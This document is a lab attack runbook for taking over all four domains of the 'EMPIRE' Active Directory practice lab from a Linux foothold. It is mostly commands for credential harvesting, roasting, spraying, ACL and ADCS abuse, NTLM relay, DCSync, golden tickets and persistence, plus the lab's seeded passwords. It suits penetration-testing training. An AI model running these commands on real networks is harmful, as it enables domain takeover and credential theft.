# EMPIRE Lab — Linux Foothold → All Domain Admins

> **Scope:** Authorized testing of the EMPIRE multi-forest lab only.
> **Start point:** `mandalore` (Ubuntu, domain-joined) — `10.10.0.15`, SSH key `vms/linux01_id`.
> **Goal:** Domain Admin / Enterprise Admin in every domain, mapping *all* viable paths.

## 0. Target Map

| Forest | Domain | NetBIOS | DC | DC IP | Subnet |
|---|---|---|---|---|---|
| empire (root) | `empire.local` | EMPIRE | coruscant | `10.10.0.10` | 10.10.0.0/16 |
| empire (child) | `eu.empire.local` | EU | deathstar | `10.10.0.11` | 10.10.0.0/16 |
| rebel | `rebel.local` | REBEL | yavin4 | `10.10.20.10` | 10.10.20.0/16 |
| trade | `trade.corp` | TRADE | neimoidia | `10.10.30.10` | 10.10.30.0/16 |

**Members (empire.local):** endor `10.10.0.12`, scarif `10.10.0.13`, kamino `10.10.0.14`, tatooine (WS) `10.10.0.100`, mandalore (Linux) `10.10.0.15`.

**Trust reality:** `empire ↔ eu` = parent/child (transitive, intra-forest). `rebel` / `trade` cross-forest trusts **likely missing** (see lab note) → treat as network-reachable but **untrusted** islands. Confirm with BloodHound `MATCH p=(:Domain)-[:TrustedBy]->(:Domain) RETURN p`.

**Lab credential:** uniform local/domain `Administrator : SithLord123!` across all forests (each forest's own account).

---

## 1. Foothold Recon — On mandalore

```bash
ssh -i vms/linux01_id labadmin@10.10.0.15
```

Pull every local secret a domain-joined Linux box leaks:

```bash
# Who am I, what realm
id; klist; realm list; cat /etc/krb5.conf

# Machine account keytab → machine acct TGT (acts as MANDALORE$)
sudo ls -l /etc/krb5.keytab && sudo klist -k /etc/krb5.keytab

# SSSD cached domain creds / hashes
sudo ls -l /var/lib/sss/db/ /var/lib/sss/secrets/
sudo strings /var/lib/sss/db/cache_*.ldb | grep -iE 'cachedPassword|userPassword'

# sudoers, cron, scripts holding domain creds
sudo cat /etc/sudoers /etc/sudoers.d/* 2>/dev/null
grep -rniE 'password|pass=|pwd|secret' /opt /home /etc/cron* /usr/local/bin 2>/dev/null

# Keytabs of any service account joined here (web/sql/etc)
sudo find / -name '*.keytab' 2>/dev/null
```

**Win conditions here:**
- `/etc/krb5.keytab` → machine account TGT → authenticated LDAP/SMB as `MANDALORE$`.
- SSSD cache → a domain user's hash/cleartext.
- Hardcoded creds in cron/scripts (lab seeds these via `vuln_cred_access`).

Get a TGT from the keytab:
```bash
sudo kinit -k 'MANDALORE$@EMPIRE.LOCAL'
klist
export KRB5CCNAME=$(ls -t /tmp/krb5cc_* | head -1)
```

---

## 2. Tooling Setup (control box or mandalore)

```bash
pipx install impacket netexec certipy-ad bloodyAD
pipx install kerbrute coercer mitm6
# bloodhound-ce-python already used for graph
```

DNS so Kerberos resolves each DC:
```bash
echo "10.10.0.10  coruscant.empire.local empire.local"   | sudo tee -a /etc/hosts
echo "10.10.0.11  deathstar.eu.empire.local eu.empire.local" | sudo tee -a /etc/hosts
echo "10.10.20.10 yavin4.rebel.local rebel.local"         | sudo tee -a /etc/hosts
echo "10.10.30.10 neimoidia.trade.corp trade.corp"        | sudo tee -a /etc/hosts
```

---

## 3. empire.local → Domain Admin (primary forest)

Run all paths in parallel; pick the first that lands.

### 3a. Cheap credential attacks
```bash
# AS-REP roast — seeded target: svc_palpatine (DoesNotRequirePreAuth)
nxc ldap 10.10.0.10 -u '' -p '' --asreproast asrep.txt
# or targeted:
impacket-GetNPUsers empire.local/svc_palpatine -no-pass -dc-ip 10.10.0.10 -format hashcat
hashcat -m 18200 asrep.txt rockyou.txt

# Kerberoast (any valid domain cred — incl MANDALORE$)
nxc ldap 10.10.0.10 -k --kerberoasting kroast.txt
hashcat -m 13100 kroast.txt rockyou.txt
```
Seeded roastable SPN accounts (`vuln_kerberos`, all crack vs rockyou):

| Account | SPN | Password | Hash mode |
|---|---|---|---|
| `svc_trooper` | `HTTP/print.empire.local` | `Summer2024` | 13100 |
| `svc_maul` | `MSSQLSvc/kamino.empire.local:1433` | `DeathStar1!` | 13100 |
| `svc_sidious` | (SPN set) | `Tarkin123` | 13100 |
| `svc_palpatine` | — (AS-REP) | — (crack it) | 18200 |
| `rebel_svc` | `HTTP/rebel.local` (rebel forest) | `RebelSvc2025!` | 13100 |

**Password spray cohort** (`vuln_cred_access`, 7 users share `SithLord123!`):
`biggs.darklighter, mon.mothma, greedo.tets, mace.windu, jabba.hutt, wilhuff.tarkin, jyn.erso`
```bash
nxc smb 10.10.0.10 -u users.txt -p 'SithLord123!' --continue-on-success
```

### 3a-bis. Delegation abuse (seeded)
- **Constrained (`svc_trooper`)**: `TrustedToAuthForDelegation` + `msDS-AllowedToDelegateTo = HTTP/tatooine.empire.local`. After cracking svc_trooper → S4U2Self+S4U2Proxy impersonate any user to tatooine:
  ```bash
  impacket-getST -spn HTTP/tatooine.empire.local -impersonate Administrator \
    -dc-ip 10.10.0.10 empire.local/svc_trooper:Summer2024
  ```
- **Unconstrained (`scarif` 10.10.0.13, `tatooine` 10.10.0.100)**: coerce DC auth to either box → capture DC TGT → DCSync.
  ```bash
  # on/relay-from scarif: monitor + coerce
  impacket-getTGT ... ; coercer coerce -t 10.10.0.10 -l <scarif_ip> -k
  ```

### 3b. BloodHound shortest path
```cypher
MATCH p=shortestPath((u {owned:true})-[*1..]->(g:Group))
WHERE g.objectid ENDS WITH '-512' RETURN p
```
Mark mandalore-derived principals as owned, then hunt ACL edges: `GenericAll`, `WriteDacl`, `ForceChangePassword`, `AddMember`, `GenericWrite` → DA group. (`vuln_lateral/acl_abuse` seeds these.)

**Seeded ACL chain (`vuln_lateral`):**

| ID | Principal | Right | Target | Payoff |
|---|---|---|---|---|
| LAT-021 | `sheev.palpatine` | **GenericAll** | **domain object** | grant self DCSync → instant DA |
| LAT-022 | `darth.maul` | Validated-SPN write | `svc_trooper` | add SPN → Kerberoast |
| LAT-025 | (WriteSPN) | — | `luke.skywalker` (`HTTP/luke.skywalker-web.empire.local:8080`) | targeted Kerberoast |
| LAT-029 | `HelpDesk` | ForceChangePassword | `IT_Team` members | reset → takeover |
| LAT-030 | `HelpDesk` | GenericWrite | `svc_bobafett2` | shadow creds / targeted roast |
| LAT-031 | `svc_bobafett` | WriteOwner | `finance_sync` group | own group → add self |
| LAT-023 | `IT_Team` | read `ms-Mcs-AdmPwd` | Computers OU | **LAPS** local-admin pw readout |

Killer path — `sheev.palpatine` → domain DCSync:
```bash
# grant DCSync rights (DS-Replication-Get-Changes*) then dump
bloodyAD -d empire.local --host 10.10.0.10 -u sheev.palpatine -p <pw> \
  add genericAll 'DC=empire,DC=local' sheev.palpatine
impacket-secretsdump empire.local/sheev.palpatine:<pw>@10.10.0.10 -just-dc
```
Generic ACL abuse with bloodyAD:
```bash
bloodyAD -d empire.local --host 10.10.0.10 -k set password <victim> 'NewPass123!'
bloodyAD -d empire.local --host 10.10.0.10 -k add groupMember 'Domain Admins' <ouruser>
```

> **Cross-forest hint (LAT-034):** rebel.local `Administrator` is added as a Foreign Security Principal in empire.local **Corporate Admins** — a real bridge between forests even without a full trust. Check it: `MATCH (n)-[:MemberOf]->(g) WHERE g.name STARTS WITH 'CORPORATE ADMINS' RETURN n,g`.

### 3c. ADCS (Certipy) — often the fastest DA
**CA:** `corp-CA` on `endor.empire.local` (10.10.0.12). Seeded templates (`vuln_adcs`):

| ESC | Template | Misconfig |
|---|---|---|
| ESC1 | `EMPIREUserESC1` | Enrollee-supplies-subject + Domain Users enroll + ClientAuth EKU, no approval |
| ESC2 | `EMPIREMachineESC2` | Any-purpose / SubCA EKU |
| ESC3 | `EMPIREAgentESC3` | Enrollment Agent template |
| ESC4 | `EMPIREWriteESC4` | Domain Users have Write over the template |
| ESC13 | `EMPIREIssuanceESC13` | Issuance policy → group link |
| ESC15 | `EMPIRENoSecExtESC15` | Schema v1, no security ext (app-policy injection) |

CA-level: **ESC6** (`EDITF_ATTRIBUTESUBJECTALTNAME2` on `corp-CA`), **ESC7** (`svc_bobafett` = Certificate Manager), **ESC8** (CertSrv HTTP+NTLM, no EPA), **ESC11** (CertSrv RPC no HTTPS).

```bash
certipy find -k -dc-ip 10.10.0.10 -vulnerable -stdout
```
- **ESC1** — fastest DA. Any domain user (e.g. cracked svc acct) enrolls `EMPIREUserESC1` with arbitrary UPN:
  ```bash
  certipy req -u svc_trooper@empire.local -p 'Summer2024' \
    -ca corp-CA -target endor.empire.local \
    -template EMPIREUserESC1 -upn administrator@empire.local
  certipy auth -pfx administrator.pfx -dc-ip 10.10.0.10      # → NT hash / TGT
  ```
- **ESC6** — any template works since CA honors SAN: same `-upn administrator` trick on any enrollable template.
- **ESC7** — compromise `svc_bobafett` → approve own ESC3/agent request, or add SAN via officer rights.
- **ESC8** — web enrollment relay, see §3d.
- **ESC15** — `EMPIRENoSecExtESC15` (schema v1): inject Client-Auth application policy:
  ```bash
  certipy req -u <user> -p <pw> -ca corp-CA -template EMPIRENoSecExtESC15 \
    -upn administrator@empire.local -application-policies '1.3.6.1.5.5.7.3.2'
  ```

### 3d. Coerce + NTLM relay → DC takeover
```bash
# Relay DC auth to ADCS web enroll (ESC8) → DC cert → DCSync
ntlmrelayx.py -t http://10.10.0.13/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
coercer coerce -l <attacker_ip> -t 10.10.0.10 -u 'MANDALORE$' -k   # PetitPotam/PrinterBug
# auth with the DC cert:
certipy auth -pfx coruscant.pfx -dc-ip 10.10.0.10
```
Or relay to LDAP for RBCD if signing off (`vuln_lateral/relay`, `coerce`).

### 3e. DCSync (after any DA-equiv or DCSync right)
```bash
secretsdump.py -k -just-dc empire.local/administrator@coruscant.empire.local
# or: nxc smb 10.10.0.10 -k --ntds
```
→ krbtgt hash → **Golden Ticket** persistence.

---

## 4. eu.empire.local (child) → Enterprise Admin (intra-forest)

Child DA → forest EA via the trust. Two classic primitives:

### 4a. Child krbtgt → forged inter-realm TGT w/ SID history
```bash
# get child krbtgt + child SID + EA group SID (519)
secretsdump.py -k -just-dc-user eu/krbtgt eu.empire.local/administrator@deathstar.eu.empire.local

ticketer.py -nthash <eu_krbtgt> -domain eu.empire.local \
  -domain-sid <eu_SID> \
  -extra-sid <empire_SID>-519 \
  Administrator
# use ticket → DCSync the parent
KRB5CCNAME=Administrator.ccache secretsdump.py -k -just-dc empire.local/Administrator@coruscant.empire.local
```

### 4b. Trust key (alternative)
Dump the `EMPIRE$`/`EU$` trust account key, forge cross-realm referral TGT. Same SID-history `-extra-sid ...-519` trick.

> First get child DA via §3 techniques **against deathstar 10.10.0.11** (same playbook, child DC).

---

## 5. rebel.local & trade.corp (cross-forest) — Untrusted Islands

If trusts absent, no Kerberos path from empire. Attack each over the routed network as standalone forests.

```bash
# reachability
nxc smb 10.10.20.10 10.10.30.10

# uniform lab cred works as local/domain admin in each
nxc smb 10.10.20.10 -u Administrator -p 'SithLord123!' -d rebel.local
nxc smb 10.10.30.10 -u Administrator -p 'SithLord123!' -d trade.corp
```

Then repeat **§3 wholesale** against each DC:
- `nxc ldap <dc> --asreproast / --kerberoasting`
- `certipy find -vulnerable` (each forest has own ADCS surface)
- coerce + relay, ACL abuse, DCSync.

**If trusts DO exist** (verify in BloodHound): forge inter-realm TGT from empire krbtgt with `-extra-sid <foreign_domain_SID>-519` (only works for intra-*forest*; cross-*forest* SID filtering usually blocks 519 — fall back to standalone compromise unless SID filtering misconfigured, which the lab may seed).

**Pivot option** if a domain isn't directly routable: SOCKS through a compromised dual-homed host:
```bash
proxychains nxc smb 10.10.30.10 ...   # via ligolo/chisel from a foothold box
```

---

## 6. Per-Domain Persistence (post-DA)

```bash
# Golden ticket (per domain krbtgt)
ticketer.py -nthash <krbtgt> -domain-sid <SID> -domain <domain> falcon

# Diamond / sapphire (stealthier), DCSync rights to a low-priv acct, ADCS forged cert (no krbtgt rotation needed)
certipy ca -backup ...    # steal CA key → forge any cert forever
```

---

## 7. Path Summary (visual)

```
mandalore (Linux foothold)
  ├─ keytab/SSSD secret ─┐
  └─ MANDALORE$ TGT ─────┤
                         ▼
              empire.local recon (BloodHound)
        ┌──────────┬──────────┬──────────┬──────────┐
   AS-REP/Kerb  ACL abuse   ADCS ESC1   Coerce+Relay(ESC8)
        └──────────┴────┬─────┴──────────┴──────────┘
                        ▼
                 empire.local DA ──DCSync──> krbtgt (Golden)
                        │
            ┌───────────┴───────────┐
        child eu DA            (network pivot)
        SID-history 519              │
            ▼                        ▼
     Enterprise Admin        rebel.local / trade.corp
     (whole empire forest)   standalone compromise (§3 repeat)
                                     ▼
                             DA in ALL 4 domains
```

---

## Appendix A — All Seeded Secrets (quick reference)

**Cleartext / crackable creds:**
- Forest admin (all 4 domains): `Administrator : SithLord123!`
- Spray cohort (7 users): `SithLord123!`
- Kerberoast: `svc_trooper:Summer2024`, `svc_maul:DeathStar1!`, `svc_sidious:Tarkin123`, `rebel_svc:RebelSvc2025!`
- AS-REP: `svc_palpatine` (no preauth → crack)
- rebel.local users: `han.solo`, `padme.amidala` = `Rebel1234!`

**Stored-credential surfaces (`vuln_cred_access`):**
- **GPP cpassword** in SYSVOL → decrypts with public MS key (gpp-decrypt)
- **DBeaver** `credentials-config.json` → `sa : DeathStar2025!` (kamino:1433)
- **SCCM NAA** blob → `svc_sccm` (DPAPI-style)
- LM compat level 1 on members/WS → NTLMv1 capture via Responder

**Kerberos misconfig (`vuln_kerberos`):**
- Constrained deleg: `svc_trooper` → `HTTP/tatooine.empire.local`
- Unconstrained deleg: `scarif`, `tatooine` computer accounts
- RC4-only enctype on roastable accounts (faster cracking)

**ADCS (`vuln_adcs`, CA = `corp-CA` @ endor):**
- Templates: `EMPIREUserESC1` (ESC1), `EMPIREMachineESC2`, `EMPIREAgentESC3`, `EMPIREWriteESC4`, `EMPIREIssuanceESC13`, `EMPIRENoSecExtESC15`
- CA flags: ESC6 (SAN), ESC7 (`svc_bobafett`=cert mgr), ESC8 (HTTP+NTLM), ESC11 (RPC no-HTTPS)

**ACL edges (`vuln_lateral`):** see §3b table — `sheev.palpatine` GenericAll on domain = top prize.

**Other relay/coerce:** Spooler+EFS enabled on DCs (PetitPotam/PrinterBug), WSUS SPN `HTTP/wsus.empire.local` (SRV-046).

---

## 8. Quick Checklist

- [ ] Loot mandalore: keytab, SSSD cache, scripts/cron creds
- [ ] MANDALORE$ TGT → authenticated recon
- [ ] BloodHound CE: shortest path to `-512`, trust map
- [ ] empire.local DA via fastest of: Kerberoast / AS-REP / ACL / ADCS / coerce-relay
- [ ] DCSync coruscant → krbtgt + all hashes
- [ ] Child eu DA → SID-history → Enterprise Admin
- [ ] rebel.local DA (standalone, DC 10.10.20.10)
- [ ] trade.corp DA (standalone, DC 10.10.30.10)
- [ ] Golden/cert persistence per domain
- [ ] Document, then reset lab
